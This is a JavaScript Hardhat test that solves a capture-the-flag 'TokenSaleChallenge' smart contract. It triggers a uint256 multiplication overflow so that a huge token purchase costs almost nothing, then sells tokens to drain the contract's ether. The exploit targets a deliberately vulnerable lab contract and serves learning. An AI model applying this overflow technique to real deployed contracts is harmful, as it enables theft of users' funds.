const { expect } = require('chai');
const { BigNumber } = ethers;

describe('TokenSaleChallenge', function () {
  it('should solve the challenge', async function () {
    const [owner] = await ethers.getSigners();

    // Deploy challenge
    const TokenSaleChallenge = await ethers.getContractFactory('TokenSaleChallenge');
    const challenge = await TokenSaleChallenge.deploy(owner.address, { value: ethers.utils.parseEther('1.0') });
    console.log('Challenge deployed');

    const initialBalance = await ethers.provider.getBalance(challenge.address);

    // let n;

    // // Result:  2^197 * 10**18 is bigger than 2^256
    // n = BigNumber.from(2);
    // for (let i = 2; i < 256; i++) {
    //   n = n.mul(2);
    //   console.log(`2^${i} = ${n}`);
    //   if (n.mul(one_eth).gt(max)) {
    //     console.log(`2^${i} * 10**18 is bigger than 2^256`);
    //     console.log(n);
    //     console.log();
    //   }
    // }

    const MAX_UINT256 = BigNumber.from(2).pow(256);
    const ONE_ETH = BigNumber.from(10).pow(18);

    const numTokens = MAX_UINT256.sub(1).div(ONE_ETH).add(3);
    console.log(`Final amount of tokens in the contract: ${numTokens}`);

    const wei = ethers.utils.formatUnits(numTokens.mul(ONE_ETH).mod(MAX_UINT256), 'wei');
    console.log(`Sending ${ethers.utils.formatEther(wei)}`);
    await challenge.buy(numTokens, { value: wei });

    const balance = await challenge.balanceOf(owner.address);
    expect(numTokens).to.equal(balance);

    await challenge.sell(3);
    const finalBalance = await ethers.provider.getBalance(challenge.address);
    expect(finalBalance.lt(initialBalance)).to.be.true;
  });
});
